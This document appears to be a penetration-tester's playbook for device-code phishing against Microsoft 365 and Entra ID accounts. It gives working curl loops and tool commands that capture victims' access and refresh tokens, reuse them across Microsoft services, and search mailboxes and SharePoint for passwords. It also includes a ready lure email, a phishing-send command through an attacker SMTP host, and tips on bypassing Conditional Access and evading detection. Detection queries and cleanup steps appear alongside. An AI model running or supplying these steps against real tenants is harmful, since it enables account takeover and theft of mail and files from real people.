---
tags:
  - hack-notes
  - playbook
  - azure
  - phishing
---

# Device Code Phishing to M365 Takeover Playbook

> Phish an OAuth 2.0 device-authorization-grant ("device code") prompt to mint a victim's Entra ID access and refresh tokens with no password and (often) no MFA prompt of your own, then ride the refresh token across first-party clients (FOCI) to loot mail, files, and Teams and pivot toward tenant-wide control.

> **Attack graph position**
> **Fed by:** Entry point (a user who clicks the lure).
> **Feeds into:** [Azure AiTM Token Theft to Global Admin](Azure%20AiTM%20Token%20Theft%20to%20Global%20Admin.md)
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance
| | |
|---|---|
| Goal | Full takeover of a target M365 user (mail, OneDrive, SharePoint, Teams) and a pivot toward broader tenant access, using only tokens |
| Starting position | External attacker with a deliverable lure channel (email, Teams, chat) to a target user, and outbound HTTPS to `login.microsoftonline.com` |
| End state | Persistent access tokens + refresh token for the victim across multiple Microsoft resources; enumerated tenant; staged privilege-escalation leads (consent grants, app registration, role-eligible accounts) |
| Key techniques | T1566 Phishing, T1566.002 Spearphishing Link, T1528 Steal Application Access Token, T1550.001 Application Access Token, T1098.003 Additional Cloud Roles |
| Prerequisites | Device code flow not blocked by Conditional Access for the chosen client/resource; victim completes the prompt inside the code lifetime (~15 min) |
| Difficulty | Medium |
| Noise level | Moderate. Quiet on the network (legit Microsoft endpoints, no proxy infra) but distinctive in Entra sign-in logs (`deviceCode` protocol, single-factor on an unusual client) |

## Attack Path
```
[Attacker host]
   |
   |  1. POST /common/oauth2/v2.0/devicecode   (juicy first-party client_id, e.g. Office / Azure CLI)
   v
[Entra issues device_code + user_code + verification_uri + expires_in]
   |
   |  2. Deliver lure: "go to microsoft.com/devicelogin and enter ABCD-EFGH"
   |     (must land inside ~15 min window)
   v
[Victim authenticates + satisfies their own MFA at Microsoft's real page]
   |
   |  3. Poll /token with grant_type=device_code until authorization_pending clears
   v
[Attacker receives access_token + refresh_token  (no password captured)]
   |
   |  4. Redeem refresh_token for OTHER audiences  (FOCI reuse: Graph, Outlook, SharePoint, AzureMgmt)
   v
[Multi-resource tokens]
   |
   |  5. Enumerate + loot: Graph recon, CAPS dump, mailbox/SharePoint/Teams search
   v
[6. Escalation hunt: consent grants, app registration, eligible roles] --> broader tenant

   DECISION (step 1/3): CA blocks device code OR this client?
      -> swap to another FOCI client_id and retry
      -> still blocked? pivot to illicit OAuth consent-grant phishing (sibling technique)
```

## Prerequisites and Setup
- A sanctioned engagement with phishing and cloud-identity testing in scope. Get the target user list and rules of engagement in writing.
- Lure channel to the target: an email pretext, a Teams message, or a chat. Device code phishing has no credential-capture page, so the lure must drive the victim to `https://microsoft.com/devicelogin` (or `https://login.microsoftonline.com/common/oauth2/deviceauth`) and have them paste a short code. Pretexts that work: "verify your account / Teams device", "join the new collaboration space", a calendar or meeting "device pairing".
- Outbound TLS to `login.microsoftonline.com`. No reverse-proxy infrastructure is needed (this is the key contrast with AiTM, below).
- Tooling on the attacker host, pick what fits:
  - `curl` for the raw flow (always works, fewest dependencies).
  - **TokenSmith** (JUMPSEC) for a clean browser-based token mint with Intune-compliant-device CA bypass (`-i`).
  - **GraphRunner** (dafthack) for the device-code grab plus the full recon and loot suite.
  - **roadtx** (ROADtools, dirkjanm) for device-code, refresh-token redemption, and onward PRT / device-registration work.
  - **AADInternals** (Gerenios) for `Invoke-AADIntPhishing` end-to-end lure automation.
- A FOCI client-ID cheat list (these are public Microsoft first-party GUIDs). Family members share refresh tokens, so a token minted for one redeems for the others:

  | Client | client_id |
  |---|---|
  | Microsoft Office | `d3590ed6-52b3-4102-aeff-aad2292ab01c` |
  | Microsoft Azure CLI | `04b07795-8ddb-461a-bbee-02f9e1bf7b46` |
  | Microsoft Azure PowerShell | `1950a258-227b-4e31-a9cf-717495945fc2` |
  | Microsoft Teams | `1fec8e78-bce4-4aaf-ab1b-5451cc387264` |
  | Microsoft Authentication Broker | `29d9ed98-a469-4536-ade2-f981bc1d605e` |
  | OneDrive SyncEngine | `ab9b8c07-8f02-4f72-87fa-80105867a763` |
  | Outlook Mobile | `27922004-5251-4030-b22d-91ecd9a37ea4` |

  The Office client (`d359...`) is the usual first pick: broad, expected for any M365 user, and a FOCI member, so its refresh token pivots everywhere.

## Walkthrough

### Step 1. Initiate the device code request
What and why: ask Entra for a device code on behalf of a juicy first-party client. You get a `user_code` (the short string the victim types) and a `device_code` (your polling handle). The clock starts now, typically ~900s (`expires_in`).

```bash
# Raw flow. Use the Office client_id and a broad scope.
curl -s -X POST \
  "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c" \
  -d "scope=https://graph.microsoft.com/.default offline_access openid profile" \
  | tee devicecode.json | jq
```

Success signal: JSON with `user_code`, `device_code`, `verification_uri` (`https://microsoft.com/devicelogin`), `expires_in`, and `interval` (poll cadence, usually 5s).

```json
{
  "user_code": "ABCD-EFGH",
  "device_code": "DAQABAAEAAAD...long...",
  "verification_uri": "https://microsoft.com/devicelogin",
  "expires_in": 900,
  "interval": 5,
  "message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code ABCD-EFGH to authenticate."
}
```

Tool equivalents:
```bash
# roadtx: starts device-code flow and prints the code, then polls automatically
roadtx gettokens -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
  -r https://graph.microsoft.com --device-code

# AADInternals (PowerShell): start the flow / drive the whole lure
Get-AADIntAccessTokenForMSGraph -DeviceCode -SaveToCache
```

```powershell
# GraphRunner: device-code grab against a chosen client/resource
Get-GraphTokens -Client Graph        # interactive device-code by default
# or target a specific FOCI client:
Get-GraphTokens -ClientID d3590ed6-52b3-4102-aeff-aad2292ab01c -Resource "https://graph.microsoft.com"
```

Decision / branch: if the request itself is refused or the later sign-in is blocked by a Conditional Access "authentication flows" policy (Microsoft began rolling out a managed CA policy that blocks device code flow in 2025, and many tenants now enforce it), do not give up. Swap to a different FOCI `client_id` (Teams or Azure CLI behave differently against some CA scoping), or pivot to the consent-grant variation in Variations and Pivots. Note the `deviceCodeFlow` event can still appear "successful" in some logs even when CA blocks the resource leg, so confirm you actually got usable tokens in Step 3.

### Step 2. Deliver the lure inside the window
What and why: the victim must open the verification URL and enter the `user_code` before `expires_in`. The whole social-engineering value sits in this short window, so generate the code immediately before sending, or use a tool (SquarePhish-style two-stage, or AADInternals) that generates the code on click.

```powershell
# AADInternals: send the device-code lure by email and capture the token on success
Invoke-AADIntPhishing `
  -Recipients "victim@corp.local" `
  -Subject "Action required: re-verify your Microsoft 365 device" `
  -Sender "it-support@corp.local" `
  -SMTPServer "smtp.attacker.test" `
  -Message $htmlBody `
  -SaveToCache
```

Lure body essentials (keep it short and Microsoft-plausible):
```
Your Microsoft 365 session needs re-verification.
1. Open https://microsoft.com/devicelogin
2. Enter code: ABCD-EFGH
3. Sign in with your work account.
This code expires in 15 minutes.
```

Success signal: nothing yet on your side. Success surfaces in Step 3 when polling returns tokens. If your lure tool reports "code expired", regenerate (Step 1) and resend.

Decision / branch: for larger or slower campaigns, use a two-stage delivery (a benign landing link that, on click, calls Step 1 server-side and shows a fresh code) so the code is never stale. This is the model commoditized by SquarePhish/SquarePhishV2 and later PhaaS kits. It removes the "expired before they clicked" failure entirely.

### Step 3. Poll the token endpoint
What and why: repeatedly POST the `device_code` to `/token`. You will get `authorization_pending` until the victim finishes (including their own MFA), then the real tokens land. Respect `interval` to avoid `slow_down`.

```bash
DEVICE_CODE=$(jq -r .device_code devicecode.json)

while true; do
  RESP=$(curl -s -X POST \
    "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
    -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c" \
    -d "device_code=${DEVICE_CODE}")
  ERR=$(echo "$RESP" | jq -r '.error // empty')
  if [ -z "$ERR" ]; then
    echo "$RESP" | tee tokens.json | jq
    break
  fi
  case "$ERR" in
    authorization_pending) sleep 5 ;;
    slow_down)             sleep 10 ;;
    *) echo "FATAL: $RESP"; break ;;   # expired_token, authorization_declined, etc.
  esac
done
```

Success signal: JSON containing `access_token`, `refresh_token`, `id_token`, `token_type: Bearer`, `expires_in`, and a `scope` line. The presence of `refresh_token` (you requested `offline_access`) is what makes the rest of the chain possible. The password was never seen, and the MFA the victim satisfied was Microsoft's, not a prompt you have to defeat.

```bash
# sanity-check who you are and the token audience
jq -r .access_token tokens.json | cut -d. -f2 | base64 -d 2>/dev/null | jq '{aud, appid, upn, scp, amr}'
```

Decision / branch: if you only ever get `authorization_pending` until `expired_token`, the victim never completed (re-lure) or CA blocked the resource leg after auth. If the decoded `amr` shows only `pwd` (single factor) you have likely bypassed a weak MFA config; if it shows `mfa`, the victim's own MFA was satisfied at Microsoft and you still hold the tokens. Either way you proceed.

### Step 4. Redeem the refresh token for other resources (FOCI reuse)
What and why: the refresh token you hold is a family refresh token. You can swap it for access tokens for any other first-party client in the FOCI family and for different resource audiences, without re-prompting the victim. This is how one device-code phish becomes mail + files + Teams + Azure management at once.

```bash
RT=$(jq -r .refresh_token tokens.json)

# Refresh-token redemption helper: pass a target resource (audience)
redeem () {
  curl -s -X POST \
    "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=refresh_token" \
    -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c" \
    -d "refresh_token=${RT}" \
    -d "scope=${1} offline_access openid profile"
}

redeem "https://graph.microsoft.com/.default"        | tee graph.json   | jq .scope
redeem "https://outlook.office365.com/.default"       | tee outlook.json | jq .scope
redeem "https://corp.sharepoint.com/.default"         | tee spo.json     | jq .scope   # use the tenant SPO host
redeem "https://management.azure.com/.default"         | tee arm.json     | jq .scope
```

Tool equivalents:
```bash
# roadtx: redeem a cached refresh token for a new client (FOCI swap) or resource
roadtx gettokens --refresh-token file -c msteams                       # swap to Teams client
roadtx gettokens --refresh-token <RT> -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46 \
  -r https://management.azure.com/                                      # Azure CLI client -> ARM
roadtx refreshtokento -r https://graph.microsoft.com/                  # reuse cached RT + client
```

```powershell
# GraphRunner: refresh into specific resources
Invoke-RefreshGraphTokens -RefreshToken $rt -tenantid $tid -Client Outlook
Invoke-RefreshToSharePointToken -domain "corp.sharepoint.com" -Tokens $tokens
```

Success signal: each call returns a fresh `access_token` whose decoded `aud` matches the requested resource. If FOCI reuse works, you did not have to re-phish for any of these.

Decision / branch: if a refresh into a particular resource fails with `invalid_grant` or a CA error, that resource has CA scoping the Office client cannot satisfy. Swap the `client_id` to a different family member (Teams, Azure CLI) and retry, the family token still redeems. If every redemption to Azure management fails, the victim simply has no Azure RBAC, so stay in M365 (Graph/Outlook/SPO/Teams) and loot there.

### Step 5. Enumerate and loot
What and why: with Graph and resource tokens in hand, map the tenant and pull the valuable content. Lead with recon (so you understand the blast radius and the CA you are operating under), then targeted search.

```powershell
# GraphRunner, $tokens is the object from Get-GraphTokens
Invoke-GraphRecon -Tokens $tokens -PermissionEnum          # org info, auth policy, user/app settings
Invoke-DumpCAPS -Tokens $tokens -ResolveGuids               # all Conditional Access policies (know the rules)
Get-AzureADUsers -Tokens $tokens -OutFile users.txt         # full user list
Invoke-DumpApps -Tokens $tokens                             # app registrations, scopes, consented users, risky external apps

# Targeted content looting
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password AND filetype:xlsx'
Get-Inbox -Tokens $tokens                                   # read the victim mailbox

# One-shot sweep: recon + users + groups + CAPS + apps + mail/SPO/Teams keyword search
Invoke-GraphRunner -Tokens $tokens
```

```bash
# Raw Graph equivalents with the access token from Step 4
AT=$(jq -r .access_token graph.json)
curl -s -H "Authorization: Bearer $AT" "https://graph.microsoft.com/v1.0/me" | jq
curl -s -H "Authorization: Bearer $AT" "https://graph.microsoft.com/v1.0/me/messages?\$top=25&\$select=subject,from,receivedDateTime" | jq
curl -s -H "Authorization: Bearer $AT" "https://graph.microsoft.com/v1.0/me/drive/root/children" | jq '.value[].name'
curl -s -H "Authorization: Bearer $AT" "https://graph.microsoft.com/v1.0/users?\$top=999&\$select=userPrincipalName,jobTitle,department" | jq
```

Success signal: directory data and search hits returned. Keyword sweeps over mail and SharePoint commonly surface secrets, VPN/cred docs, and onward access. Note what scopes you actually have (`scp` claim) so you do not waste calls on endpoints the token cannot reach.

### Step 6. Hunt for privilege escalation
What and why: turn a single user takeover into tenant leverage. Three reliable leads:

```powershell
# 1. Over-permissioned / risky OAuth consent grants already in the tenant (and your victim's consent reach)
Invoke-DumpApps -Tokens $tokens
#   look for apps with Mail.ReadWrite, Files.ReadWrite.All, Directory.ReadWrite.All consented broadly

# 2. Can the victim register or own apps? (app-registration -> own credential -> standing access)
$AT = $tokens.access_token
# check directory role + app registration ability via Graph
```
```bash
# Directory roles the victim holds (any admin role is an immediate win)
curl -s -H "Authorization: Bearer $AT" \
  "https://graph.microsoft.com/v1.0/me/memberOf?\$select=displayName,id" | jq '.value[].displayName'

# 3. PIM-eligible (role-eligible) assignments: eligible Global/Privileged Role admin is a pivot target
curl -s -H "Authorization: Bearer $AT" \
  "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleInstances" | jq
```

Success signal: any admin role membership, an eligible privileged role the victim can activate, the ability to register an application (own client secret = durable access independent of this phish), or a discoverable risky consent grant you can abuse or clone.

Decision / branch: stop at the proven primitive. If you find an eligible Global Admin role, document the path and (only if in scope and reversible) activate it; do not make destructive or irreversible directory changes to "prove" impact. Persistence via a new app registration or a malicious consent grant is high-impact and high-noise, only stage it if the ROE explicitly allows it, and record every artifact for cleanup.

## OPSEC and Detection
This chain is quiet on the wire (all traffic is to genuine Microsoft endpoints, no proxy like AiTM) but it leaves a distinctive identity trail. Assume a mature SOC catches it.

What defenders see:
- **Entra sign-in logs**: the giveaway is `AuthenticationProtocol == "deviceCode"`. A device-code sign-in for a user/app that never legitimately uses it is the primary detection. Hunt:
  ```kusto
  SigninLogs
  | where ResultType == 0
  | where AuthenticationProtocol == "deviceCode"
  | where AppDisplayName !in (<approved device-code apps>)
  | summarize count() by UserPrincipalName, AppDisplayName, AppId, IPAddress, UserAgent
  ```
- **IP / user-agent mismatch across the two legs**: device code produces an interactive leg (victim's IP/UA at the auth) and a non-interactive token leg (attacker's IP/UA). Correlating both legs by `CorrelationId` and flagging a location or UA mismatch is the strongest signal. The victim authenticates from their network; your polling and refresh calls come from your host.
- **Single-factor where you expected MFA**: weak configs surface as `pwd`-only `amr`. Anomalous strong-auth context with device code is flagged by the 2025-era detections.
- **Unusual client/resource combos**: an Office or Azure CLI client suddenly requesting Outlook + SharePoint + ARM audiences in quick succession (your FOCI redemptions) is anomalous. Refresh-token redemptions for many audiences from one host in minutes is a refresh-token-anomaly signal in current detections.
- **Microsoft 2025 detections and policy**: after Storm-2372, Microsoft shipped device-code-flow risk detections and a managed Conditional Access policy that blocks device code flow for tenants not using it (Conditions > Authentication Flows > Device code flow > Block). Many EDR/SIEM vendors added prebuilt "Entra ID OAuth device code phishing" rules in 2025.

Reducing noise (within ROE):
- Send from / poll from an IP geographically near the target where possible to blunt the impossible-travel and IP-mismatch signals.
- Use a realistic `-Device`/`-Browser` profile (GraphRunner and roadtx let you set these) so the UA is plausible.
- Keep the FOCI fan-out slow and spaced rather than redeeming every audience in one burst.
- Prefer reading over writing. Every write (forwarding rule, app registration, consent) adds high-signal events.
- Do not register a device or request a PRT unless the engagement needs it: device registration is loud and ties an attacker IP to a Windows Hello registration event that defenders explicitly join against the device-code sign-in.

## Cleanup
Revert every artifact you created. Token theft is low-artifact, but onward actions are not.
- **Revoke the sessions and refresh tokens you used** so they cannot be reused after handoff:
  ```bash
  curl -s -X POST -H "Authorization: Bearer $AT" \
    "https://graph.microsoft.com/v1.0/users/victim@corp.local/revokeSignInSessions"
  ```
  Note: revoking invalidates refresh tokens. A password reset alone does NOT (this is a core property of the attack), so explicitly revoke.
- **Mailbox rules**: if you created any inbox forwarding/hiding rule (e.g. `Invoke-CreateInboxForwardingRule`), delete it via Graph (`DELETE /me/mailFolders/inbox/messageRules/{id}`) or Outlook.
- **OAuth app / consent artifacts**: remove any app registration, service principal, client secret, or consent grant you added. GraphRunner: `Invoke-DeleteOAuthApp`. Otherwise `DELETE /applications/{id}` and revoke the service principal / `oauth2PermissionGrants`.
- **Role activations**: if you activated a PIM-eligible role, deactivate it; do not leave a standing assignment.
- **Local files**: shred `devicecode.json`, `tokens.json`, `graph.json`, `.roadtools_auth`, the AADInternals token cache, and any looted content per the engagement's data-handling rules.
- Provide the SOC with the exact `CorrelationId`s and timestamps so they can confirm the activity was yours and close it cleanly.

## Troubleshooting
- **Code expired before the victim clicked** (`expired_token`): the ~15 min window is the usual killer. Generate the code immediately before sending, or move to a two-stage lure that mints a fresh code on click. Resend Step 1 + Step 2.
- **Only `authorization_pending` forever**: the victim never completed, or CA blocked the resource leg after their auth. Confirm delivery, re-lure, and check sign-in logs for a `deviceCodeFlow` event that succeeded auth but failed the grant (CA).
- **`AADSTS70016` / device code blocked / CA "authentication flow" failure**: the tenant enforces the device-code block. Swap `client_id` to a different FOCI member and retry; if all are blocked, pivot to consent-grant phishing (below).
- **`slow_down` while polling**: you polled faster than `interval`. Back off (sleep 10s) and continue.
- **Refresh-token redemption fails for one resource (`invalid_grant` / CA)**: that audience has CA the current client cannot meet. Swap to another FOCI `client_id` and re-redeem; the family token still works for the others. If ARM/management always fails, the victim simply lacks Azure RBAC, stay in M365.
- **Token audience/scope wrong** (Graph call returns 401/403): decode the access token and check `aud` and `scp`. You are likely using a token minted for a different resource, redeem specifically for the resource you are calling, and confirm the scope you need is present.
- **`invalid_client` on the token call**: `client_id` mismatch between the devicecode request and the token request, they must be identical.

## Variations and Pivots
- **Contrast with AiTM (Adversary-in-the-Middle) token theft**: AiTM uses a reverse proxy (Evilginx/Tycoon-style) to relay the real login and steal the session cookie/token mid-flow. Device code phishing achieves a similar token-theft outcome with **no proxy infrastructure**, no spoofed domain, and no TLS cert to manage, the victim authenticates at Microsoft's genuine page. Trade-off: AiTM yields a session cookie (good for browser replay and PRT cookie work), device code yields refresh tokens directly (good for headless, long-lived API access and FOCI fan-out). If device code is CA-blocked, the AiTM route is the natural alternative. See [Azure AiTM Token Theft to Global Admin](Azure%20AiTM%20Token%20Theft%20to%20Global%20Admin.md).
- **Illicit OAuth consent-grant phishing (sibling technique)**: instead of a device code, lure the victim to consent to an attacker-registered multi-tenant app requesting `Mail.Read`, `Files.ReadWrite.All`, `offline_access`, etc. On consent you get an app refresh token that survives password resets and is independent of any device-code CA block. This is the primary pivot when device code flow is blocked at the tenant. Stage your app registration ahead of time.
- **FOCI client swapping as a CA bypass**: when one first-party client is CA-restricted, another family member often is not. The family refresh token redeems across all of them, so client swapping is both an escalation and an evasion lever. TokenSmith's `-i` / `--intune-bypass` extends this to bypass Intune-compliant-device CA from a non-compliant host.
- **PRT and device registration escalation**: with a token for the Microsoft Authentication Broker client you can register a device and request a Primary Refresh Token (roadtx supports the full flow), turning a user phish into device-grade access and a path toward broader Conditional Access bypass. Loud, only with explicit ROE.
- **Pipe the loot onward**: feed enumerated users/apps/CAPS and discovered creds into the broader Entra/M365 methodology, and any harvested host or VPN creds into internal pivoting.

## Related
- [Phishing and Social Engineering](../Checklists/Phishing%20and%20Social%20Engineering.md)
- [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md)
- [Azure AiTM Token Theft to Global Admin](Azure%20AiTM%20Token%20Theft%20to%20Global%20Admin.md)
- [Email Security](../Checklists/Email%20Security.md)
- [Azure and Entra ID](../Cheatsheets/Azure%20and%20Entra%20ID.md)
